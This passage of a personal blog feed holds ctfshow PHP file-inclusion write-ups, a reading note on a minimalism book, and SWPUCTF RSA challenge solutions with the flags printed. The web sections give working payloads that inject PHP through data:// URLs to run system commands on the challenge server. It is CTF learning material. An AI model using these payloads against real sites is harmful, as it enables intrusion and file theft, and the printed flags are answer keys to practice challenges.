class="keyword">__FILE__</span>);</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>把1换成a即可。</p><figure class="highlight php"><table><tbody><tr><td class="code"><pre><span class="line">?c=<span class="keyword">include</span><span class="variable">$_GET</span>[a]<span class="meta">?&gt;</span>&amp;a=data:<span class="comment">//text/plain,&lt;?php system("tac flag.php")?&gt;</span></span><br></pre></td></tr></tbody></table></figure><hr><h2 id="09-web37"><a href="#09-web37" class="headerlink" title="09 web37"></a>09 web37</h2><p>🚩flag：<code>ctfshow{5d7cf4ad-c66e-4ea2-8652-54aac73a6fcc}</code></p><p>💡hint：<code>文件包含</code></p><figure class="highlight php"><table><tbody><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-09-04 00:12:34</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-09-04 05:18:55</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//flag in flag.php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">'c'</span>])){</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">'c'</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">"/flag/i"</span>, <span class="variable">$c</span>)){</span><br><span class="line">        <span class="keyword">include</span>(<span class="variable">$c</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    </span><br><span class="line">    }</span><br><span class="line">        </span><br><span class="line">}<span class="keyword">else</span>{</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>相比于web29，是从eval($c);变成了include($c);<br>        echo $flag;<br>eval($c)→ include($c)​ - 从代码执行变为文件包含</p><p>可以用</p><figure class="highlight php"><table><tbody><tr><td class="code"><pre><span class="line">?c=data:<span class="comment">//text/plain,&lt;?php system("tac fla*.php")?&gt;</span></span><br></pre></td></tr></tbody></table></figure><hr><h2 id="10-web38"><a href="#10-web38" class="headerlink" title="10 web38"></a>10 web38</h2><p>🚩flag：<code>ctfshow{7b18bb00-5db5-4ce3-94c2-0c9f691d0ef5}</code></p><p>💡hint：<code>文件包含</code></p><p>限制flag php file<br>同上</p><figure class="highlight php"><table><tbody><tr><td class="code"><pre><span class="line">`?c=data:<span class="comment">//text/plain,&lt;?=system("tac fla*")?&gt;`</span></span><br></pre></td></tr></tbody></table></figure><p>没有php，就用简化版的</p><p>今天先做这么多啦🎵～</p><p><img src="https://a1.boltp.com/2026/02/04/6983569b85946.png"></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>读书-01《极简主义人生整理术》</title>
      <link href="/2026/02/04/%E8%AF%BB%E4%B9%A6-01%E3%80%8A%E6%9E%81%E7%AE%80%E4%B8%BB%E4%B9%89%E4%BA%BA%E7%94%9F%E6%95%B4%E7%90%86%E6%9C%AF%E3%80%8B/"/>
      <url>/2026/02/04/%E8%AF%BB%E4%B9%A6-01%E3%80%8A%E6%9E%81%E7%AE%80%E4%B8%BB%E4%B9%89%E4%BA%BA%E7%94%9F%E6%95%B4%E7%90%86%E6%9C%AF%E3%80%8B/</url>
      
        <content type="html"><![CDATA[<p>2026年 阅读进度：1/100本<br><strong>摘要：</strong> 本书源自作者在人生低谷中的真实觉醒，通过整理一间15平米的出租屋开始，逐步探索极简主义在个人生活中的重要性。作者详细阐述了收纳的六个发展阶段和十步流程，帮助读者从空间整理入手，逐步实现生活的从容与有序。在精神层面，书中探讨了物质、目标、表达、财务、心态、精力和情绪极简的策略，帮助读者构筑简约而充实的生活哲学。通过人生整理的步骤和方法，本书引导读者重构人生，提升生活质量，最终实现内心的丰盈与自由。通过整理，读者不仅可以清理物质空间，更能清理内心世界，为真正重要的人与事腾出空间。</p><p><strong>关键词：</strong> <code>极简主义</code> <code>收纳整理</code></p><p>作者：程愿兵</p><p>阅读时间：2026年2月4日<br>阅读时长：1小时33分钟（含写博客）</p><p>⬆️<a href="https://sereniusx.github.io/books/">回到书单界面</a></p><p>大多数人只擅长选择的本能——被欲望驱动、被他人影响、被惯性裹挟，却缺乏决策的智慧：不知道哪些选择能通向真正想要的生活，更不知道如何在纷繁复杂的选项中，筛选出最有价值的部分。</p><p>FIRE运动的核心逻辑：人生的自由，并非源于拥有多少财富，而是源于对“欲望”与“需求“的清醒认知，以及对生活的掌控力。</p><p>整理从来不是“扔掉东西”，而是“重新定义生活”；极简也不是“苦行僧式的放弃”，而是“清醒地拥有”。</p><hr><h2 id="第一部分-人生启迪：一场从收纳开始的自我救赎"><a href="#第一部分-人生启迪：一场从收纳开始的自我救赎" class="headerlink" title="第一部分 人生启迪：一场从收纳开始的自我救赎"></a>第一部分 人生启迪：一场从收纳开始的自我救赎</h2><p>“阅人无数不如名师指路，名师指路不如自我顿悟。”<br>断舍离的核心是“筛选”，判断标准是“这件物品是否能让你当下感到愉悦，是否对当下的生活有价值。”<br>整理的终极意义，从来不是让生活变得“一无所有”，而是让生活回归“恰好拥有”——拥有让你心动的物品，拥有滋养你的关系，拥有清晰的目标，拥有从容的时间，拥有平静的内心。</p><hr><h2 id="第二部分-收纳实操：从空间有序到生活从容"><a href="#第二部分-收纳实操：从空间有序到生活从容" class="headerlink" title="第二部分 收纳实操：从空间有序到生活从容"></a>第二部分 收纳实操：从空间有序到生活从容</h2><p>整理的核心：<strong>适配生活，以人为本</strong><br>整理不是标准化操作，而是个性化方案。让空间适配人，而不是人适配空间。<br>极简不是一无所有，而是恰好够用。<br>整理成功的前提是懂需求。<br>沟通-&gt;清空-&gt;清洁-&gt;分类-&gt;整理-&gt;规划-&gt;整顿-&gt;收纳-&gt;标识-&gt;清场</p><hr><h2 id="第三部分-精神内核：极简主义的生活智慧"><a href="#第三部分-精神内核：极简主义的生活智慧" class="headerlink" title="第三部分 精神内核：极简主义的生活智慧"></a>第三部分 精神内核：极简主义的生活智慧</h2><h3 id="01-物质极简"><a href="#01-物质极简" class="headerlink" title="01 物质极简"></a>01 物质极简</h3><p>生活的治愈力，从来不在物品的数量堆砌里，而在“物尽其用，心无旁骛”的平衡之中。<br>人生的不同阶段，有着不同的核心目标。<br>人生的起步阶段：刚毕业，积累资本、提升自己，为未来铺路。核心原则：物品量够用即可，功能一物多用，消费理性克制。节省时间，专注学习<br>事业稳定后：追求品质和体验。放弃数量，追求品质，淘汰所有低品质、不喜欢、不适配的东西，只保留“优质、心动、刚需”的东西，让每一件物品都能为生活带来愉悦与滋养。真正的面子，不是拥有多少昂贵的物品，而是生活的舒适感与掌控感。<br>退休后：追求平静与自在，回归生活的本真</p><p><strong>物品价值分类：实用价值，情绪价值，纪念价值</strong></p><p>分类处理法，让舍弃的物品发挥剩余价值。常见方法有：捐赠，转卖，改造，丢弃。</p><p>固定位置法：就近原则，高频优先原则，清晰标识原则。</p><h3 id="02-目标极简"><a href="#02-目标极简" class="headerlink" title="02 目标极简"></a>02 目标极简</h3><p>目标极简：一个阶段只专注一件事。</p><h3 id="03-表达极简"><a href="#03-表达极简" class="headerlink" title="03 表达极简"></a>03 表达极简</h3><p><strong>表达极简：</strong>精炼有力，让沟通直抵核心诉求。不是可以少说话，而是用最少的语言，传递最核心的信息。说太多容易模糊重点，引发误解，拉低印象，失去信任。</p><p>表达极简的四大原则：</p><ol><li>结论先行——先给答案，再补理由</li><li>逻辑清晰——用结构串起信息</li><li>共情为先——高效不冷漠</li><li>克制留白——不说多余的话</li></ol><p>工作场合分场景实操：</p><ol><li>汇报工作：项目进展/结果+成果/问题+需要什么支持</li><li>开会发言：观点+一个支撑+建议</li><li>跨部门协作：需求+要求+时间</li></ol><p>日常沟通：</p><ol><li>拒绝：感谢+原因+替代方案</li><li>表达不满：事实+感受+需求</li><li>分享交流：观点+一个细节+引导对方</li></ol><p>书面表达：</p><ol><li>邮件：主题+正文+行动</li><li>微信消息：每段说一个核心信息，不超过3行</li><li>报告：框架+数据。（背景、目标、成果、问题、方案）</li></ol><h3 id="04-财务极简"><a href="#04-财务极简" class="headerlink" title="04 财务极简"></a>04 财务极简</h3><p>核心原则：</p><ol><li>分清必需与想要——只花值得花的钱</li><li>进出平衡——一物进一物出</li><li>价值最大化——让每一分钱都发挥作用</li><li>建立财务安全体系——攒下对抗风险的底气</li></ol><p>5个方法：</p><ol><li>购物节流：冷静期+替代法，杜绝冲动消费</li><li>日常消耗极简：减少浪费，砍掉隐形成本（食品采购拒绝囤积、新鲜适量，水电节流、资源循环合理使用，通信节流、精简套餐）</li><li>积分与优惠：免费资源变现，降低消费成本</li><li>搭建被动收入：转卖二手物品、知识产品售卖</li><li>财务复盘：每月一次，及时调整</li></ol><h3 id="05-心态极简"><a href="#05-心态极简" class="headerlink" title="05 心态极简"></a>05 心态极简</h3><p>物质底气：6个月应急储备金<br>经历磨砺：所有坎坷，都是心态的磨刀石<br>认知升级：不跟琐事较劲，才是心态极简的核心<br>未雨绸缪：提前预备，让心态再可控中从容。</p><p>心态极简，是向内扎根的力量。</p><h3 id="06-精力极简"><a href="#06-精力极简" class="headerlink" title="06 精力极简"></a>06 精力极简</h3><p>精力：体力（身体基础）+脑力（思维效率）+心力（情绪能量）的综合体</p><p>筑牢精力底盘：</p><ol><li>多睡觉</li><li>多运动</li><li>多喝水</li><li>少食，清淡均衡，不给身体添负担</li><li>少言，精简表达，节省情绪能量</li><li>少想，放下执念，跳出精神内耗</li></ol><p>构建能量循环：</p><ol><li>目标极简，只抓1～3个精力锚点</li><li>减少无效消耗，砍掉无效社交，砍掉信息过载，砍掉完美主义。完成比完美更重要，设定最低完成标准，允许不完美。</li></ol><h3 id="07-情绪极简"><a href="#07-情绪极简" class="headerlink" title="07 情绪极简"></a>07 情绪极简</h3><p>情绪急救：</p><ol><li>爱好沉浸法</li><li>场景抽离法</li><li>情绪疗愈角</li></ol><p>从根源止损，不做情绪的奴隶。<br>理性反击：不吵架也能坚守底线，做不好惹的好人</p><h3 id="08-关系极简"><a href="#08-关系极简" class="headerlink" title="08 关系极简"></a>08 关系极简</h3><p>所有长久的联结，都离不开双向滋养<br>人性的底层是趋利避害。利包含：物质利益，情感滋养，成长启发，实用帮助。</p><p>关系极简的原则：少而精，双向奔赴，势均力敌<br>真心+价值维护<br>提升自身价值，成为值得被交往的人</p><hr><h2 id="第四部分-人生整理：从空间整理到人生重构"><a href="#第四部分-人生整理：从空间整理到人生重构" class="headerlink" title="第四部分 人生整理：从空间整理到人生重构"></a>第四部分 人生整理：从空间整理到人生重构</h2><p>人生整理步骤：</p><ol><li>盘点人生库存：当下的能力边界、占据时间的琐事、牵动情绪的执念、支撑生活的财富状况、被搁置的期待</li><li>剥离外在期待：自己真正想要的生活到底是什么样子</li><li>清理人生冗余：筛选和舍弃</li><li>建立人生秩序：让日常有迹可循</li><li>聚焦核心目标：二八法则的运用</li><li>深耕核心能力：打造人生硬底牌</li><li>筛选优质联结：让关系成为滋养</li><li>盘活闲置资源：闲置的物品、随拍呢的时间、未被发掘的能力、被忽略的人脉</li><li>定期复盘迭代：人生整理不是一次性的动作，没有一成不变的计划，也没有永远正确的选择，唯有定期复盘，才能及时纠偏。</li><li>守住极简本心：在繁华世界里，保持清醒的认知，保持内心的宁静。</li></ol>]]></content>
      
      
      <categories>
          
          <category> 读书 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 收纳整理 </tag>
            
            <tag> 极简主义 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTF-SWPUCTF2025秋季新生赛5</title>
      <link href="/2026/02/04/CTF-SWPUCTF2025%E7%A7%8B%E5%AD%A3%E6%96%B0%E7%94%9F%E8%B5%9B5/"/>
      <url>/2026/02/04/CTF-SWPUCTF2025%E7%A7%8B%E5%AD%A3%E6%96%B0%E7%94%9F%E8%B5%9B5/</url>
      
        <content type="html"><![CDATA[<p><em>题目来源：NSSCTF</em></p><p><em>练习时间：2026年2月4日</em></p><p><em>练习数量：4</em></p><p>上篇：<a href="https://sereniusx.github.io/2026/02/03/CTF-SWPUCTF2025%E7%A7%8B%E5%AD%A3%E6%96%B0%E7%94%9F%E8%B5%9B4/">CTF-SWPUCTF2025秋季新生赛4</a></p><p>📖 <strong>SWPUCTF 2025 秋季新生赛合集</strong>：<br>1️⃣<a href="https://sereniusx.github.io/2026/01/31/CTF-SWPUCTF2025%E7%A7%8B%E5%AD%A3%E6%96%B0%E7%94%9F%E8%B5%9B1/">CTF-SWPUCTF2025秋季新生赛1</a><br>2️⃣<a href="https://sereniusx.github.io/2026/02/01/CTF-SWPUCTF2025%E7%A7%8B%E5%AD%A3%E6%96%B0%E7%94%9F%E8%B5%9B2/">CTF-SWPUCTF2025秋季新生赛2</a><br>3️⃣<a href="https://sereniusx.github.io/2026/02/02/CTF-SWPUCTF2025%E7%A7%8B%E5%AD%A3%E6%96%B0%E7%94%9F%E8%B5%9B3/">CTF-SWPUCTF2025秋季新生赛3</a><br>4️⃣<a href="https://sereniusx.github.io/2026/02/03/CTF-SWPUCTF2025%E7%A7%8B%E5%AD%A3%E6%96%B0%E7%94%9F%E8%B5%9B4/">CTF-SWPUCTF2025秋季新生赛4</a><br>5️⃣<a href="https://sereniusx.github.io/2026/02/04/CTF-SWPUCTF2025%E7%A7%8B%E5%AD%A3%E6%96%B0%E7%94%9F%E8%B5%9B5/">CTF-SWPUCTF2025秋季新生赛5</a></p><hr><h2 id="⭐️-14-SWPUCTF-2025-秋季新生赛-factor？mod？"><a href="#⭐️-14-SWPUCTF-2025-秋季新生赛-factor？mod？" class="headerlink" title="⭐️ 14 [SWPUCTF 2025 秋季新生赛]factor？mod？"></a>⭐️ 14 [SWPUCTF 2025 秋季新生赛]factor？mod？</h2><p>🚩flag：<code>NSSCTF{Wh@t_4r3_y0u_pO1nt?}</code></p><p>💡hint：<code>CRYPTO</code> <code>RSA</code> <code>素数分解</code></p><p>🔧tool：<code>python</code></p><p>原题：</p><figure class="highlight python"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> getPrime, inverse, bytes_to_long, GCD</span><br><span class="line"></span><br><span class="line">FLAG = <span class="string">b"NSSCTF{*******}"</span></span><br><span class="line"></span><br><span class="line">p = getPrime(<span class="number">496</span>)    </span><br><span class="line">q = getPrime(<span class="number">16</span>)     </span><br><span class="line">N = p * q</span><br><span class="line">phi = (p - <span class="number">1</span>) * (q - <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> k_candidate <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>, <span class="number">200</span>):</span><br><span class="line">    e_candidate = <span class="number">65537</span> * k_candidate + <span class="number">1</span></span><br><span class="line">    <span class="keyword">if</span> GCD(e_candidate, phi) == <span class="number">1</span>:</span><br><span class="line">        k = k_candidate</span><br><span class="line">        e = e_candidate</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">d = inverse(e, phi)</span><br><span class="line">m = bytes_to_long(FLAG)</span><br><span class="line">c = <span class="built_in">pow</span>(m, e, N)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f"N = <span class="subst">{N}</span>"</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f"c = <span class="subst">{c}</span>"</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f"e_mod_65537 = <span class="subst">{e % <span class="number">65537</span>}</span>"</span>)   </span><br><span class="line"><span class="built_in">print</span>(<span class="string">f"PHI_mod_65537 = <span class="subst">{phi % <span class="number">65537</span>}</span>"</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># N = 7766768698831459057447624753799597048605145237159899787468949300915452509464565099496679099145810975822175634998097262892579678554704760323902554901001931</span></span><br><span class="line"><span class="comment"># c = 3032034114991327495494398063970483186189941361342590220935258419146172566936781482456512156238329348954750763279841189333666924656636066281016492074315344</span></span><br><span class="line"><span class="comment"># e mod 65537 = 1</span></span><br><span class="line"><span class="comment"># PHI_mod_65537 = 43577</span></span><br></pre></td></tr></tbody></table></figure><p>q = getPrime(16) 只有 16 bit，也就是一个很小的素数因子，所以 N 可以直接被快速分解，一旦分解出 p,q，RSA 就能正常求私钥解密。</p><p>解题脚本：</p><figure class="highlight python"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> inverse, long_to_bytes, GCD</span><br><span class="line"><span class="keyword">import</span> sympy <span class="keyword">as</span> sp</span><br><span class="line"></span><br><span class="line">N = <span class="number">7766768698831459057447624753799597048605145237159899787468949300915452509464565099496679099145810975822175634998097262892579678554704760323902554901001931</span></span><br><span class="line">c = <span class="number">3032034114991327495494398063970483186189941361342590220935258419146172566936781482456512156238329348954750763279841189333666924656636066281016492074315344</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 1) factor N: q is 16-bit prime</span></span><br><span class="line">q = <span class="literal">None</span></span><br><span class="line"><span class="keyword">for</span> prime <span class="keyword">in</span> sp.primerange(<span class="number">2</span>, <span class="number">1</span> &lt;&lt; <span class="number">16</span>):</span><br><span class="line">    <span class="keyword">if</span> N % prime == <span class="number">0</span>:</span><br><span class="line">        q = prime</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">p = N // q</span><br><span class="line">phi = (p - <span class="number">1</span>) * (q - <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 2) recover e from e = 65537*k + 1</span></span><br><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>, <span class="number">200</span>):</span><br><span class="line">    e = <span class="number">65537</span> * k + <span class="number">1</span></span><br><span class="line">    <span class="keyword">if</span> GCD(e, phi) == <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 3) decrypt</span></span><br><span class="line">d = inverse(e, phi)</span><br><span class="line">m = <span class="built_in">pow</span>(c, d, N)</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(m))</span><br></pre></td></tr></tbody></table></figure><p>解题结果：<br>b‘NSSCTF{Wh@t_4r3_y0u_pO1nt?}’</p><hr><h2 id="⭐️-15-SWPUCTF-2025-秋季新生赛-ezmod"><a href="#⭐️-15-SWPUCTF-2025-秋季新生赛-ezmod" class="headerlink" title="⭐️ 15 [SWPUCTF 2025 秋季新生赛]ezmod"></a>⭐️ 15 [SWPUCTF 2025 秋季新生赛]ezmod</h2><p>🚩flag：<code>NNSSCTF{Wh4t_3xact1y_d0e5_an_8_a.m._c1a5s_m3an}</code></p><p>💡hint：<code>CRYPTO</code> <code>RSA</code> <code>素数分解</code> <code>费马小定理</code></p><p>🔧tool：<code>python</code></p><p>原题：</p><figure class="highlight python"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> libnum <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">flag = <span class="string">b"NSSCTF{***************}"</span></span><br><span class="line">m1 = s2n(flag[<span class="number">0</span>:<span class="built_in">len</span>(flag)//<span class="number">2</span>])</span><br><span class="line">m2 = s2n(flag[<span class="built_in">len</span>(flag)//<span class="number">2</span>:])</span><br><span class="line"></span><br><span class="line">p1 = getPrime(<span class="number">512</span>)</span><br><span class="line">q1 = getPrime(<span class="number">512</span>)</span><br><span class="line">n1 =p1*q1</span><br><span class="line">e1 = getPrime(<span class="number">15</span>)</span><br><span class="line">e2 = getPrime(<span class="number">15</span>)</span><br><span class="line">hint1 = <span class="built_in">pow</span>(e2*p1+e1*q1,<span class="number">2</span>,n1)</span><br><span class="line">hint2 = <span class="built_in">pow</span>((p1+e2)*q1,e1,n1)</span><br><span class="line">c1=<span class="built_in">pow</span>(m1,<span class="number">65537</span>,n1)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p2 = getPrime(<span class="number">512</span>)</span><br><span class="line">q2 = getPrime(<span class="number">512</span>)</span><br><span class="line">r = getPrime(<span class="number">512</span>)</span><br><span class="line">n2 = p2*q2*r</span><br><span class="line">hint3 = <span class="built_in">pow</span>(p2*q2**<span class="number">2</span>+r,p2,n2)</span><br><span class="line">hint4 = <span class="built_in">pow</span>(p2*q2*r+q2+r,p2,n2)</span><br><span class="line">hint5 = <span class="built_in">pow</span>(r**<span class="number">2</span>+<span class="number">1</span>,m2,r**<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">'n1 = '</span>,n1)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">'e1 = '</span>,e1)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">'e2 = '</span>,e2)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">'c1 = '</span>,c1)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">'hint2 = '</span>,hint2)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">'hint1 = '</span>,hint1)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">'n2 = '</span>,n2)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">'hint3 = '</span>,hint3)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">'hint4 = '</span>,hint4)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">'hint5 = '</span>,hint5)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># n1 =  69237412819939639452602923767390021440483462182682879972053689337566305146360670141885719490681273734760061512519320363972997519120208982200937497939609239656895817642113833504695009955103513083736827796959971881574254357515577554120238786887083984552104374617519795066378544484239723381870277406815344816333</span></span><br><span class="line"><span class="comment"># e1 =  29527</span></span><br><span class="line"><span class="comment"># e2 =  20117</span></span><br><span class="line"><span class="comment"># c1 =  29091310695342856566138644401065835896832250861184448854997851711346752666744213880628516094732261931894315036306410329745248525044513718362465300436701334890744982477672840197643709318354899748726146475571529311179946813181381358178861493626190582931509706101754396232759316452157394231162762993017545388413</span></span><br><span class="line"><span class="comment"># hint2 =  35064290617684889168326866883116063909046848851566428690678819117544793799571693709457524424684621704495903073634509282445170100417712329053124327037228710541383897618165318789436757925443415160782651229020549677843858532532771577582051147943146243696815139130166282984736042542125453264858041896972533226829</span></span><br><span class="line"><span class="comment"># hint1 =  6684343928626259115166556536967237351704873870967672531851104012737638516939912489158888115396930384822560698673563498898490639775761096112411751814558903510006095703737660799311396164641693857972158521286705142411677136118464043578480075934828150802349974263484801212589479718679655427434597007764470156881</span></span><br><span class="line"><span class="comment"># n2 =  1345452346323458846685078201357739237930456697726463214841840378972748510374939760683716312429693260865118966731854460154556882413775350647221842518311385613574199367419368259373562227767966719390051368563739831674520939480848992603419586010579222762497163771709730786459075520090201718825633880843179147482733505895506557434742546890561936473748675630866436648001676410604303149849018119601033995027851824674505929142399828357204316834997808360126991477224901719</span></span><br><span class="line"><span class="comment"># hint3 =  847188571113943173287332469527967344011334943746227619399621256260877662268276902469817095373874888480020071468062585786037818342625399891363280962564316441064449832009670275586211975663877027865035973739632012813329247804225301535242488377690663593897904931237203520895777439199763949284015075990326550163802234666394658195172638253704737050298013115065181864025540632934830257887421985531190093051146583215774752000629314051518227632851605979279986676394796845</span></span><br><span class="line"><span class="comment"># hint4 =  806668794330377497579889477399120279541227586456038436879781285391665348755137976786329245671139948859359946788143532968544043837955414909826507013343756603308599647221325686544191625843232340416160397119858073908352503811559979566876363266612113621634034075141694073726351946703452197479179194460281502325911084357841305170261155379651873650770166579405942671807649621165262056859860734822943050236603538147024706785308699380519584964634415545709968346683403784</span></span><br><span class="line"><span class="comment"># hint5 =  824023351148258203438869300498693582257573642933589256075919307337418863180477757714828211190934112905395542087377464543208715687979548609801730334216105292953134985687665222287478128775799341477741181300324116951794054625966987353659492980465028187867334398317297053360048397682372264656563428873630084268151903278298458772453240199263614327092856105929207255270</span></span><br></pre></td></tr></tbody></table></figure><p>解题脚本：</p><figure class="highlight python"><table><tbody><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># solve.py  (Python 3)</span></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes, inverse, GCD</span><br><span class="line"></span><br><span class="line"><span class="comment"># ====== given ======</span></span><br><span class="line">n1 = <span class="number">69237412819939639452602923767390021440483462182682879972053689337566305146360670141885719490681273734760061512519320363972997519120208982200937497939609239656895817642113833504695009955103513083736827796959971881574254357515577554120238786887083984552104374617519795066378544484239723381870277406815344816333</span></span><br><span class="line">e1 = <span class="number">29527</span></span><br><span class="line">e2 = <span class="number">20117</span></span><br><span class="line">c1 = <span class="number">29091310695342856566138644401065835896832250861184448854997851711346752666744213880628516094732261931894315036306410329745248525044513718362465300436701334890744982477672840197643709318354899748726146475571529311179946813181381358178861493626190582931509706101754396232759316452157394231162762993017545388413</span></span><br><span class="line">hint2 = <span class="number">35064290617684889168326866883116063909046848851566428690678819117544793799571693709457524424684621704495903073634509282445170100417712329053124327037228710541383897618165318789436757925443415160782651229020549677843858532532771577582051147943146243696815139130166282984736042542125453264858041896972533226829</span></span><br><span class="line">hint1 = <span class="number">6684343928626259115166556536967237351704873870967672531851104012737638516939912489158888115396930384822560698673563498898490639775761096112411751814558903510006095703737660799311396164641693857972158521286705142411677136118464043578480075934828150802349974263484801212589479718679655427434597007764470156881</span></span><br><span class="line"></span><br><span class="line">n2 = <span class="number">1345452346323458846685078201357739237930456697726463214841840378972748510374939760683716312429693260865118966731854460154556882413775350647221842518311385613574199367419368259373562227767966719390051368563739831674520939480848992603419586010579222762497163771709730786459075520090201718825633880843179147482733505895506557434742546890561936473748675630866436648001676410604303149849018119601033995027851824674505929142399828357204316834997808360126991477224901719</span></span><br><span class="line">hint3 = <span class="number">847188571113943173287332469527967344011334943746227619399621256260877662268276902469817095373874888480020071468062585786037818342625399891363280962564316441064449832009670275586211975663877027865035973739632012813329247804225301535242488377690663593897904931237203520895777439199763949284015075990326550163802234666394658195172638253704737050298013115065181864025540632934830257887421985531190093051146583215774752000629314051518227632851605979279986676394796845</span></span><br><span class="line">hint4 = <span class="number">806668794330377497579889477399120279541227586456038436879781285391665348755137976786329245671139948859359946788143532968544043837955414909826507013343756603308599647221325686544191625843232340416160397119858073908352503811559979566876363266612113621634034075141694073726351946703452197479179194460281502325911084357841305170261155379651873650770166579405942671807649621165262056859860734822943050236603538147024706785308699380519584964634415545709968346683403784</span></span><br><span class="line">hint5 = <span class="number">824023351148258203438869300498693582257573642933589256075919307337418863180477757714828211190934112905395542087377464543208715687979548609801730334216105292953134985687665222287478128775799341477741181300324116951794054625966987353659492980465028187867334398317297053360048397682372264656563428873630084268151903278298458772453240199263614327092856105929207255270</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># ====== Part 1: recover (p1, q1) and decrypt m1 ======</span></span><br><span class="line">q1 = GCD(hint2, n1)</span><br><span class="line"><span class="keyword">assert</span> q1 != <span class="number">1</span> <span class="keyword">and</span> n1 % q1 == <span class="number">0</span>, <span class="string">"Failed to recover q1"</span></span><br><span class="line"></span><br><span class="line">p1 = n1 // q1</span><br><span class="line">phi1 = (p1 - <span class="number">1</span>) * (q1 - <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">E = <span class="number">65537</span></span><br><span class="line">d1 = inverse(E, phi1)</span><br><span class="line">m1_int = <span class="built_in">pow</span>(c1, d1, n1)</span><br><span class="line">m1 = long_to_bytes(m1_int)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">"[+] q1 ="</span>, q1)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">"[+] p1 ="</span>, p1)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">"[+] m1 ="</span>, m1)</span><br><span class="line"></span><br><span class="line"><span class="comment"># (Optional) quick sanity: hint2 should be multiple of q1</span></span><br><span class="line"><span class="keyword">assert</span> hint2 % q1 == <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># ====== Part 2: recover r from gcd(hint5-1, n2), then get m2 from (hint5-1)/r^2 ======</span></span><br><span class="line">r = GCD(hint5 - <span class="number">1</span>, n2)</span><br><span class="line"><span class="keyword">assert</span> r != <span class="number">1</span> <span class="keyword">and</span> n2 % r == <span class="number">0</span>, <span class="string">"Failed to recover r"</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Because hint5 &lt; r^3, we can extract m2 exactly from binomial expansion:</span></span><br><span class="line"><span class="comment"># hint5 ≡ 1 + m2*r^2 (mod r^3)  and 0 &lt;= hint5 &lt; r^3  =&gt;  hint5-1 = m2*r^2</span></span><br><span class="line">m2_int = (hint5 - <span class="number">1</span>) // (r * r)</span><br><span class="line">m2 = long_to_bytes(m2_int)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">"[+] r  